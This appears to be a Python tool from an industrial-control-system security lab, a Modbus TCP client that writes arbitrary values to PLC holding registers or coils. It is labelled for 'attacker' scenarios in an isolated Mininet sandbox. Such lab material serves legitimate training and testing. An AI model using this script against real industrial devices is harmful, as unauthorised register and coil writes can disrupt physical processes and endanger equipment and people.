#!/usr/bin/env python3
"""
Cliente de escrita Modbus para os cases S2/S4 (modo real, executa no namespace
do `attacker`). Opcional: `pip install pymodbus`. ISOLADO no sandbox Mininet.

    python3 tools/modbus_write.py --host 10.20.0.20 --reg 40001 --value 900
    python3 tools/modbus_write.py --host 10.20.0.20 --coil 20 --value 1
"""
import argparse

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=502)
    ap.add_argument("--reg", type=int, help="holding register (ex. 40001)")
    ap.add_argument("--coil", type=int, help="coil number")
    ap.add_argument("--value", type=int, required=True)
    a = ap.parse_args()
    try:
        from pymodbus.client import ModbusTcpClient
    except Exception:
        raise SystemExit("pymodbus ausente. Instale: pip install pymodbus")
    c = ModbusTcpClient(a.host, port=a.port); c.connect()
    if a.reg is not None:
        addr = a.reg - 40001
        print(c.write_register(addr, a.value))
    elif a.coil is not None:
        print(c.write_coil(a.coil, bool(a.value)))
    c.close()

if __name__ == "__main__":
    main()
